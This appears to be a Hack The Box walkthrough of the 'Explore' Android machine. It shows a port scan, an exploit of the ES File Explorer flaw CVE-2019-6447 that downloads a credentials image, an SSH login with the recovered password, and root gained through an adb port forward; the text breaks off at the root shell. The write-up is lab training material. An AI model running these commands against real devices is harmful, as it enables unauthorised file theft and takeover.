## Port Scan

## Port 2222
SSH-2.0-SSH Server - Banana Studio 

## Port 5555
This port is being used by Android Debug Bridge (adb) and is filtered

## Port 59777
A quick google search showed that port 59777 is used by ES File Explorer. ES File Explorer is a file manager/explorer for android devices. It looks like there is a CVE for ES File Explorer CVE:2019-6447, I used a poc script I found on github https://github.com/fs0c131y/ESFileExplorerOpenPortVuln. This script lets me list and download files off the device.

There was a great write up of this bug https://medium.com/@knownsec404team/analysis-of-es-file-explorer-security-vulnerability-cve-2019-6447-7f34407ed566 

Using the tool I was able to find a file called "creds.jpg"

```
â”Œâ”€â”€(rootðŸ’€kali)-[~/htb/explore]
â””â”€# python3 poc.py --cmd listPics --ip 10.10.10.247 
[*] Executing command: listPics on 10.10.10.247

```

I downloaded it

```
â”Œâ”€â”€(rootðŸ’€kali)-[~/htb/explore]
â””â”€# python3 poc.py -g /storage/emulated/0/DCIM/creds.jpg --ip 10.10.10.247

```

It was a picture of some credentials `kristi:Kr1sT!5h@Rp3xPl0r3!`

## User Shell

I was able to ssh into it by using the credentials found 

```
â”Œâ”€â”€(rootðŸ’€kali)-[~/htb]
â””â”€# ssh -p 2222 kristi@10.10.10.247
Password authentication
Password: 
```

Looking inside `/sdcard` I found the user flag

## Root
Back when I did my nmap scan port 5555 was running adb. Now that we have a valid ssh session we can port forward back to kali and access adb

I found the commands for abd here https://adbshell.com/

Port forward
`ssh kristi@10.10.10.247 -p 2222 -L 5555:localhost:5555`

Connect to abd
`adb connect 127.0.0.1:5555`

We can restart the adb service as root
`adb root`

From there adb is running with high privs so we can drop into a shell and su to root
```
â”€â”€(rootðŸ’€kali)-[~/htb]
â””â”€# adb shell                                                                                                                                                                                                                            1 â¨¯
